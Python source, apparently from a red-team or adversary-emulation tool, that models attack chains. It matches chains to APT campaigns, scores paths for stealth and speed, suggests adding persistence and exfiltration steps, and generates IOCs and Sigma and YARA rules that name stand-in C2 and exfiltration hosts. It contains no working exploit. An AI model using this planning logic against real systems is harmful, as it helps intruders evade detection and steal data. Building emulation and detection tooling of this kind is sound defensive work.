# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class ThreatIntelItem:
    """Threat intelligence data item"""
    intel_id: str
    name: str
    source: str
    severity: str
    iocs: List[str]
    related_cves: List[str]
    ttps: List[str]
    first_seen: str
    last_seen: str
    confidence: float  # 0-1


class ThreatIntelFusion:
    """Fuse threat intelligence from multiple sources"""
    
    # Known threat actor campaigns with their TTPs
    THREAT_CAMPAIGNS = {
        'apt29': {
            'name': 'APT29 (Cozy Bear)',
            'nation': 'Russia',
            'targets': ['Government', 'Energy', 'Defense'],
            'common_techniques': ['T1566.001', 'T1059.001', 'T1053.005', 'T1547.001'],
            'severity': 'CRITICAL',
        },
        'apt28': {
            'name': 'APT28 (Fancy Bear)',
            'nation': 'Russia',
            'targets': ['Government', 'Military', 'Journalism'],
            'common_techniques': ['T1566.002', 'T1071.001', 'T1105', 'T1083'],
            'severity': 'CRITICAL',
        },
        'lazarus': {
            'name': 'Lazarus Group',
            'nation': 'North Korea',
            'targets': ['Financial', 'Cryptocurrency', 'Entertainment'],
            'common_techniques': ['T1566.001', 'T1059.003', 'T1486', 'T1105'],
            'severity': 'CRITICAL',
        },
        'apt41': {
            'name': 'APT41 (Winnti)',
            'nation': 'China',
            'targets': ['Healthcare', 'Gaming', 'Technology'],
            'common_techniques': ['T1190', 'T1059.001', 'T1003.001', 'T1071.001'],
            'severity': 'HIGH',
        },
        'fin7': {
            'name': 'FIN7 (Carbanak)',
            'nation': 'Unknown',
            'targets': ['Retail', 'Hospitality', 'Financial'],
            'common_techniques': ['T1566.001', 'T1059.001', 'T1055', 'T1041'],
            'severity': 'HIGH',
        },
    }
    
    @classmethod
    def match_chain_to_campaigns(cls, nodes: List[dict]) -> List[Dict]:
        """Match chain techniques to known threat campaigns"""
        matches = []
        
        # Get techniques from chain
        chain_techniques = set()
        for node in nodes:
            node_type = node.get('type', 'exploit')
            if node_type in MITRE_ATTACK_MAPPING:
                for tech_id, _ in MITRE_ATTACK_MAPPING[node_type].get('techniques', []):
                    chain_techniques.add(tech_id)
        
        # Match against campaigns
        for campaign_id, campaign in cls.THREAT_CAMPAIGNS.items():
            campaign_techniques = set(campaign['common_techniques'])
            overlap = chain_techniques & campaign_techniques
            
            if overlap:
                match_score = len(overlap) / len(campaign_techniques) * 100
                matches.append({
                    'campaign_id': campaign_id,
                    'name': campaign['name'],
                    'nation': campaign['nation'],
                    'match_score': match_score,
                    'matched_techniques': list(overlap),
                    'severity': campaign['severity'],
                })
        
        return sorted(matches, key=lambda x: -x['match_score'])
    
    @classmethod
    def get_similar_chains(cls, nodes: List[dict]) -> List[str]:
        """Suggest similar attack patterns based on techniques"""
        matches = cls.match_chain_to_campaigns(nodes)
        suggestions = []
        
        for match in matches[:3]:
            campaign = cls.THREAT_CAMPAIGNS.get(match['campaign_id'], {})
            missing_techniques = set(campaign.get('common_techniques', [])) - set(match['matched_techniques'])
            if missing_techniques:
                suggestions.append(f"Add {', '.join(list(missing_techniques)[:2])} to match {match['name']} TTPs")
        
        return suggestions


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# WHAT-IF SCENARIO ANALYZER
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class WhatIfScenario:
    """What-if scenario for chain analysis"""
    scenario_id: str
    name: str
    description: str
    modifiers: Dict[str, float]  # Factor modifiers for success rates
    detection_modifier: float
    time_modifier: float


class WhatIfAnalyzer:
    """Analyze attack chains under different scenarios"""
    
    SCENARIOS = {
        'unpatched': WhatIfScenario(
            scenario_id='unpatched',
            name='Unpatched Systems',
            description='Target has outdated systems with known vulnerabilities',
            modifiers={'exploit': 0.30, 'recon': 0.10},
            detection_modifier=-0.20,
            time_modifier=-0.30,
        ),
        'edr_enabled': WhatIfScenario(
            scenario_id='edr_enabled',
            name='EDR/XDR Enabled',
            description='Target has advanced endpoint detection',
            modifiers={'payload': -0.25, 'persistence': -0.30, 'exfil': -0.20},
            detection_modifier=0.40,
            time_modifier=0.50,
        ),
        'soc_active': WhatIfScenario(
            scenario_id='soc_active',
            name='24/7 SOC Monitoring',
            description='Active security operations center monitoring',
            modifiers={'persistence': -0.20, 'exfil': -0.30},
            detection_modifier=0.50,
            time_modifier=0.30,
        ),
        'air_gapped': WhatIfScenario(
            scenario_id='air_gapped',
            name='Air-Gapped Network',
            description='Target network isolated from internet',
            modifiers={'exfil': -0.50, 'payload': -0.20},
            detection_modifier=-0.30,
            time_modifier=1.00,
        ),
        'insider_threat': WhatIfScenario(
            scenario_id='insider_threat',
            name='Insider Threat',
            description='Attack includes insider assistance',
            modifiers={'recon': 0.40, 'exploit': 0.20, 'persistence': 0.30},
            detection_modifier=-0.40,
            time_modifier=-0.50,
        ),
        'zero_trust': WhatIfScenario(
            scenario_id='zero_trust',
            name='Zero Trust Architecture',
            description='Target uses zero trust security model',
            modifiers={'exploit': -0.15, 'persistence': -0.40, 'exfil': -0.35},
            detection_modifier=0.60,
            time_modifier=0.70,
        ),
    }
    
    @classmethod
    def analyze_scenario(cls, nodes: List[dict], scenario_id: str) -> Dict:
        """Analyze chain under a specific scenario"""
        scenario = cls.SCENARIOS.get(scenario_id)
        if not scenario:
            return {}
        
        base_success = 0.7  # Base success rate
        modified_rates = []
        
        for node in nodes:
            node_type = node.get('type', 'exploit')
            modifier = scenario.modifiers.get(node_type, 0)
            node_success = min(1.0, max(0.1, base_success + modifier))
            modified_rates.append({
                'node_id': node.get('id'),
                'node_name': node.get('name'),
                'base_rate': base_success,
                'modified_rate': node_success,
                'modifier': modifier,
            })
        
        # Calculate overall success
        overall_success = 1.0
        for rate in modified_rates:
            overall_success *= rate['modified_rate']
        
        return {
            'scenario': scenario.name,
            'description': scenario.description,
            'overall_success': overall_success,
            'node_rates': modified_rates,
            'detection_change': f"+{int(scenario.detection_modifier * 100)}%" if scenario.detection_modifier > 0 else f"{int(scenario.detection_modifier * 100)}%",
            'time_change': f"+{int(scenario.time_modifier * 100)}%" if scenario.time_modifier > 0 else f"{int(scenario.time_modifier * 100)}%",
        }
    
    @classmethod
    def compare_scenarios(cls, nodes: List[dict]) -> List[Dict]:
        """Compare chain performance across all scenarios"""
        results = []
        for scenario_id in cls.SCENARIOS:
            analysis = cls.analyze_scenario(nodes, scenario_id)
            if analysis:
                results.append({
                    'scenario_id': scenario_id,
                    'scenario_name': analysis['scenario'],
                    'success_rate': analysis['overall_success'],
                    'detection_change': analysis['detection_change'],
                })
        
        return sorted(results, key=lambda x: -x['success_rate'])


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK PATH OPTIMIZER - Find Optimal Attack Routes
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class OptimizedPath:
    """Represents an optimized attack path"""
    path_nodes: List[str]
    total_success_probability: float
    total_time_minutes: int
    stealth_score: float
    complexity_score: float
    path_description: str


class AttackPathOptimizer:
    """Find optimal attack paths based on different objectives"""
    
    OPTIMIZATION_OBJECTIVES = {
        'speed': {
            'name': 'Fastest Path',
            'description': 'Minimize total attack time',
            'icon': '‚ö°',
            'weights': {'time': -2.0, 'success': 1.0, 'stealth': 0.5},
        },
        'stealth': {
            'name': 'Stealthiest Path',
            'description': 'Minimize detection probability',
            'icon': 'ü•∑',
            'weights': {'time': 0.5, 'success': 1.0, 'stealth': 3.0},
        },
        'reliable': {
            'name': 'Most Reliable',
            'description': 'Maximize success probability',
            'icon': 'üéØ',
            'weights': {'time': 0.5, 'success': 3.0, 'stealth': 0.5},
        },
        'balanced': {
            'name': 'Balanced Approach',
            'description': 'Balance all factors equally',
            'icon': '‚öñÔ∏è',
            'weights': {'time': 1.0, 'success': 1.0, 'stealth': 1.0},
        },
    }
    
    @classmethod
    def optimize_path(cls, nodes: List[dict], connections: List[tuple], 
                      objective: str = 'balanced') -> OptimizedPath:
        """Optimize the attack path based on objective"""
        if not nodes:
            return OptimizedPath([], 0, 0, 0, 0, "No nodes to optimize")
        
        weights = cls.OPTIMIZATION_OBJECTIVES.get(objective, 
                  cls.OPTIMIZATION_OBJECTIVES['balanced'])['weights']
        
        # Build adjacency list
        graph = {n['id']: [] for n in nodes}
        for from_id, to_id in connections:
            if from_id in graph:
                graph[from_id].append(to_id)
        
        # Find all paths from first node to nodes with no outgoing connections
        start_nodes = [n['id'] for n in nodes if n.get('type') == 'recon']
        if not start_nodes:
            start_nodes = [nodes[0]['id']]
        
        end_nodes = [n['id'] for n in nodes if not graph.get(n['id'], [])]
        if not end_nodes:
            end_nodes = [nodes[-1]['id']]
        
        best_path = None
        best_score = float('-inf')
        
        def find_paths(current: str, visited: set, path: List[str]):
            nonlocal best_path, best_score
            
            path.append(current)
            visited.add(current)
            
            if current in end_nodes or not graph.get(current):
                # Evaluate this path
                score = cls._score_path(path, nodes, weights)
                if score > best_score:
                    best_score = score
                    best_path = path.copy()
            else:
                for next_node in graph.get(current, []):
                    if next_node not in visited:
                        find_paths(next_node, visited.copy(), path.copy())
        
        for start in start_nodes:
            find_paths(start, set(), [])
        
        if not best_path:
            best_path = [n['id'] for n in nodes]
        
        # Calculate final metrics
        path_nodes = [n for n in nodes if n['id'] in best_path]
        total_success = 1.0
        total_time = 0
        total_stealth = 0
        
        for node in path_nodes:
            node_type = node.get('type', 'exploit')
            base = ResourceEstimator.BASE_COSTS.get(node_type, {'time_minutes': 30, 'stealth_cost': 0.3})
            total_time += base['time_minutes']
            total_stealth += base['stealth_cost']
            total_success *= 0.75  # Base success rate per node
        
        stealth_score = max(0, 1.0 - total_stealth / len(path_nodes)) if path_nodes else 0
        
        obj_info = cls.OPTIMIZATION_OBJECTIVES.get(objective, {})
        desc = f"{obj_info.get('icon', 'üéØ')} {obj_info.get('name', 'Optimized')} - {len(best_path)} steps"
        
        return OptimizedPath(
            path_nodes=best_path,
            total_success_probability=total_success,
            total_time_minutes=total_time,
            stealth_score=stealth_score,
            complexity_score=len(best_path) / 10,
            path_description=desc
        )
    
    @classmethod
    def _score_path(cls, path: List[str], nodes: List[dict], weights: Dict) -> float:
        """Score a path based on weights"""
        path_nodes = [n for n in nodes if n['id'] in path]
        
        if not path_nodes:
            return 0
        
        # Calculate metrics
        total_time = 0
        total_stealth = 0
        total_success = 1.0
        
        for node in path_nodes:
            node_type = node.get('type', 'exploit')
            base = ResourceEstimator.BASE_COSTS.get(node_type, {'time_minutes': 30, 'stealth_cost': 0.3})
            total_time += base['time_minutes']
            total_stealth += base['stealth_cost']
            total_success *= 0.75
        
        # Normalize metrics
        time_score = 1.0 / (total_time / 60 + 1)  # Inverse of hours
        stealth_score = max(0, 1.0 - total_stealth / len(path_nodes))
        success_score = total_success
        
        # Weight and sum
        return (weights['time'] * time_score + 
                weights['success'] * success_score + 
                weights['stealth'] * stealth_score)
    
    @classmethod
    def suggest_improvements(cls, nodes: List[dict], connections: List[tuple]) -> List[str]:
        """Suggest improvements to the attack chain"""
        suggestions = []
        
        # Check for missing recon
        recon_nodes = [n for n in nodes if n.get('type') == 'recon']
        if not recon_nodes:
            suggestions.append("‚ö†Ô∏è Add reconnaissance nodes at the start")
        
        # Check for missing persistence
        persist_nodes = [n for n in nodes if n.get('type') == 'persistence']
        if len(nodes) >= 3 and not persist_nodes:
            suggestions.append("üí° Consider adding persistence mechanisms")
        
        # Check for parallel paths
        if len(connections) == len(nodes) - 1:  # Linear chain
            suggestions.append("üîÄ Consider adding parallel attack paths for redundancy")
        
        # Check for exfiltration
        exfil_nodes = [n for n in nodes if n.get('type') == 'exfil']
        if len(nodes) >= 4 and not exfil_nodes:
            suggestions.append("üì§ Add exfiltration nodes for data extraction")
        
        # Check chain length
        if len(nodes) > 10:
            suggestions.append("üìè Chain is long - consider splitting into phases")
        
        return suggestions


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# IOC (INDICATORS OF COMPROMISE) GENERATOR
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class IOCEntry:
    """Indicator of Compromise entry"""
    ioc_type: str  # ip, domain, hash, yara, sigma
    value: str
    description: str
    confidence: str  # high, medium, low
    related_node: str


class IOCGenerator:
    """Generate Indicators of Compromise from attack chain"""
    
    IOC_TEMPLATES = {
        'recon': {
            'network': [
                ('ip', '10.0.0.0/8', 'Internal network scan range'),
                ('port', '22,23,80,443,445,3389', 'Common service ports targeted'),
            ],
            'behavioral': [
                ('sigma', 'title: Network Scan Detection\nlogsource:\n  category: firewall\ndetection:\n  selection:\n    action: blocked\n  condition: selection | count() > 100', 'High volume connection attempts'),
            ],
        },
        'exploit': {
            'network': [
                ('ip', 'ATTACKER_IP', 'Source IP of exploitation attempts'),
            ],
            'file': [
                ('hash_md5', 'd41d8cd98f00b204e9800998ecf8427e', 'Exploit payload hash'),
                ('yara', 'rule exploit_payload { strings: $a = "exploit" condition: $a }', 'Exploit pattern'),
            ],
        },
        'payload': {
            'file': [
                ('hash_sha256', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'Malware payload hash'),
                ('filename', 'payload.exe, shell.php, backdoor.ps1', 'Common payload filenames'),
            ],
            'network': [
                ('domain', 'c2.attacker.com', 'Command and control domain'),
                ('ip', 'C2_SERVER_IP', 'C2 server IP address'),
            ],
        },
        'persistence': {
            'registry': [
                ('registry_key', r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'Autorun persistence'),
            ],
            'file': [
                ('path', r'C:\Windows\System32\tasks\*', 'Scheduled task location'),
            ],
            'behavioral': [
                ('sigma', 'title: Persistence Detection\nlogsource:\n  product: windows\ndetection:\n  selection:\n    EventID: 4688\n  condition: selection', 'Process creation for persistence'),
            ],
        },
        'exfil': {
            'network': [
                ('domain', 'exfil.attacker.com', 'Data exfiltration endpoint'),
                ('protocol', 'DNS, HTTPS, ICMP', 'Exfiltration protocols'),
            ],
            'behavioral': [
                ('sigma', 'title: Large Data Transfer\nlogsource:\n  category: proxy\ndetection:\n  selection:\n    bytes_out|gt: 10000000\n  condition: selection', 'Large outbound data transfer'),
            ],
        },
    }
    
    @classmethod
    def generate_iocs(cls, nodes: List[dict]) -> List[IOCEntry]:
        """Generate IOCs from attack chain nodes"""
        iocs = []
        
        for node in nodes:
            node_type = node.get('type', 'exploit')
            node_name = node.get('name', 'Unknown')
            templates = cls.IOC_TEMPLATES.get(node_type, {})
            
            for category, ioc_list in templates.items():
                for ioc_type, value, description in ioc_list:
                    # Customize value based on node
                    customized_value = value.replace('ATTACKER_IP', '192.168.1.100')
                    customized_value = customized_value.replace('C2_SERVER_IP', '203.0.113.50')
                    
                    iocs.append(IOCEntry(
                        ioc_type=ioc_type,
                        value=customized_value,
                        description=f"{node_name}: {description}",
                        confidence='high' if node_type in ('exploit', 'payload') else 'medium',
                        related_node=node.get('id', '')
                    ))
        
        return iocs
    
    @classmethod
    def export_stix(cls, iocs: List[IOCEntry]) -> str:
        """Export IOCs to STIX 2.1 format (simplified)"""
        stix_bundle = {
            "type": "bundle",
            "id": f"bundle--{datetime.now().strftime('%Y%m%d%H%M%S')}",
            "objects": []
        }
        
        for ioc in iocs:
            indicator = {
                "type": "indicator",
                "id": f"indicator--{ioc.ioc_type}-{len(stix_bundle['objects'])}",
                "name": ioc.description,
                "pattern_type": "stix",
                "pattern": f"[{ioc.ioc_type}:value = '{ioc.value[:50]}']",
                "valid_from": datetime.now().isoformat(),
                "confidence": 85 if ioc.confidence == 'high' else 60 if ioc.confidence == 'medium' else 40,
            }
            stix_bundle['objects'].append(indicator)
        
        return json.dumps(stix_bundle, indent=2)
    
    @classmethod
    def export_sigma_rules(cls, iocs: List[IOCEntry]) -> str:
        """Export Sigma detection rules"""
        rules = []
        
        sigma_iocs = [ioc for ioc in iocs if ioc.ioc_type == 'sigma']
        for ioc in sigma_iocs:
            rules.append(f"# {ioc.description}\n{ioc.value}\n---\n")
        
        return "\n".join(rules) if rules else "# No Sigma rules generated"
    
    @classmethod  
    def export_yara_rules(cls, iocs: List[IOCEntry]) -> str:
        """Export YARA detection rules"""
        rules = []
        
        yara_iocs = [ioc for ioc in iocs if ioc.ioc_type == 'yara']
        for i, ioc in enumerate(yara_iocs):
            rules.append(f"// {ioc.description}\n{ioc.value}\n")
        
        # Also generate hash-based rules
        hash_iocs = [ioc for ioc in iocs if 'hash' in ioc.ioc_type]
        if hash_iocs:
            rule = "rule generated_hashes {\n  meta:\n    description = \"Generated hash indicators\"\n  condition:\n"
            conditions = []
            for ioc in hash_iocs:
                conditions.append(f"    hash.{ioc.ioc_type.split('_')[1]}(0, filesize) == \"{ioc.value}\"")
            rule += " or\n".join(conditions)
            rule += "\n}"
            rules.append(rule)
        
        return "\n".join(rules) if rules else "// No YARA rules generated"


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CHAIN VERSION CONTROL SYSTEM
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class ChainVersion:
    """A versioned snapshot of the chain"""
    version_id: str
    timestamp: str
    description: str
    nodes_snapshot: List[dict]
    connections_snapshot: List[tuple]
    author: str
    parent_version: Optional[str] = None


class ChainVersionControl:
    """Version control for attack chains"""
    
    def __init__(self):
        self.versions: Dict[str, ChainVersion] = {}
        self.current_version: Optional[str] = None
        self.version_counter = 0
    
    def create_version(self, nodes: List[dict], connections: List[tuple], 
                       description: str, author: str = "Anonymous") -> str:
        """Create a new version snapshot"""
        self.version_counter += 1
        version_id = f"v{self.version_counter}.0"
        
        version = ChainVersion(
            version_id=version_id,
            timestamp=datetime.now().isoformat(),
            description=description,
            nodes_snapshot=[n.copy() for n in nodes],
            connections_snapshot=list(connections),
            author=author,
            parent_version=self.current_version
        )
        
        self.versions[version_id] = version
        self.current_version = version_id
        
        return version_id
    
    def get_version(self, version_id: str) -> Optional[ChainVersion]:
        """Get a specific version"""
        return self.versions.get(version_id)
    
    def get_version_history(self) -> List[ChainVersion]:
        """Get version history in chronological order"""
        return sorted(self.versions.values(), 
                     key=lambda v: v.timestamp, 
                     reverse=True)
    
    def get_diff(self, version_a: str, version_b: str) -> Dict:
        """Get differences between two versions"""
        v_a = self.versions.get(version_a)
        v_b = self.versions.get(version_b)
        
        if not v_a or not v_b:
            return {'error': 'Version not found'}
        
        nodes_a = {n['id']: n for n in v_a.nodes_snapshot}
        nodes_b = {n['id']: n for n in v_b.nodes_snapshot}
        
        added = [n for n_id, n in nodes_b.items() if n_id not in nodes_a]
        removed = [n for n_id, n in nodes_a.items() if n_id not in nodes_b]
        
        modified = []
        for n_id in set(nodes_a.keys()) & set(nodes_b.keys()):
            if nodes_a[n_id] != nodes_b[n_id]:
                modified.append({
                    'id': n_id,
                    'before': nodes_a[n_id],
                    'after': nodes_b[n_id]
                })
        
        return {
            'version_a': version_a,
            'version_b': version_b,
            'added': added,
            'removed': removed,
            'modified': modified,
            'connections_changed': set(v_a.connections_snapshot) != set(v_b.connections_snapshot)
        }
    
    def restore_version(self, version_id: str) -> Optional[tuple]:
        """Restore a specific version"""
        version = self.versions.get(version_id)
        if version:
            return (version.nodes_snapshot.copy(), 
                    list(version.connections_snapshot))
        return None


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# APT EMULATION LIBRARY - Pre-built APT Attack Chains
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

@dataclass
class APTProfile:
    """Advanced Persistent Threat profile"""
    apt_id: str
    name: str
    aliases: List[str]
    nation: str
    motivation: str
    targets: List[str]
    tools: List[str]
    techniques: List[str]
    chain_template: List[tuple]  # (name, type, x, y)


class APTEmulationLibrary:
    """Library of APT attack chain templates"""
    
    APT_PROFILES = {
        'apt29': APTProfile(
            apt_id='apt29',
            name='APT29 - Cozy Bear',
            aliases=['The Dukes', 'CozyDuke', 'Nobelium'],
            nation='Russia',
            motivation='Espionage',
            targets=['Government', 'Energy', 'Think Tanks', 'Healthcare'],
            tools=['WellMess', 'WellMail', 'SUNBURST', 'TEARDROP'],
            techniques=['T1566.001', 'T1059.001', 'T1053.005', 'T1547.001', 'T1071.001'],
            chain_template=[
                ('Spearphishing Link', 'recon', 50, 100),
                ('OAuth Token Theft', 'exploit', 200, 100),
                ('WellMess Dropper', 'payload', 350, 100),
                ('Registry Persistence', 'persistence', 500, 100),
                ('HTTPS C2', 'payload', 650, 100),
                ('Data Collection', 'exfil', 800, 100),
            ]
        ),
        'apt28': APTProfile(
            apt_id='apt28',
            name='APT28 - Fancy Bear',
            aliases=['Sofacy', 'Sednit', 'Pawn Storm'],
            nation='Russia',
            motivation='Espionage/IO',
            targets=['Military', 'Government', 'Journalism', 'Defense'],
            tools=['X-Agent', 'X-Tunnel', 'Zebrocy', 'Koadic'],
            techniques=['T1566.002', 'T1071.001', 'T1105', 'T1083', 'T1057'],
            chain_template=[
                ('Credential Harvest', 'recon', 50, 100),
                ('Malicious Attachment', 'exploit', 200, 100),
                ('Zebrocy Loader', 'payload', 350, 100),
                ('X-Agent Install', 'payload', 500, 100),
                ('WMI Persistence', 'persistence', 650, 100),
                ('HTTP/DNS Exfil', 'exfil', 800, 100),
            ]
        ),
        'apt41': APTProfile(
            apt_id='apt41',
            name='APT41 - Double Dragon',
            aliases=['Winnti', 'Barium', 'Wicked Panda'],
            nation='China',
            motivation='Espionage/Financial',
            targets=['Gaming', 'Healthcare', 'Telecom', 'Technology'],
            tools=['Shadowpad', 'Winnti', 'PlugX', 'Cobalt Strike'],
            techniques=['T1190', 'T1059.001', 'T1003.001', 'T1071.001', 'T1486'],
            chain_template=[
                ('Web App Scan', 'recon', 50, 100),
                ('SQL Injection', 'exploit', 200, 100),
                ('Web Shell', 'payload', 350, 100),
                ('ShadowPad Deploy', 'payload', 500, 100),
                ('Service Persistence', 'persistence', 650, 100),
                ('DNS Tunneling', 'exfil', 800, 100),
            ]
        ),
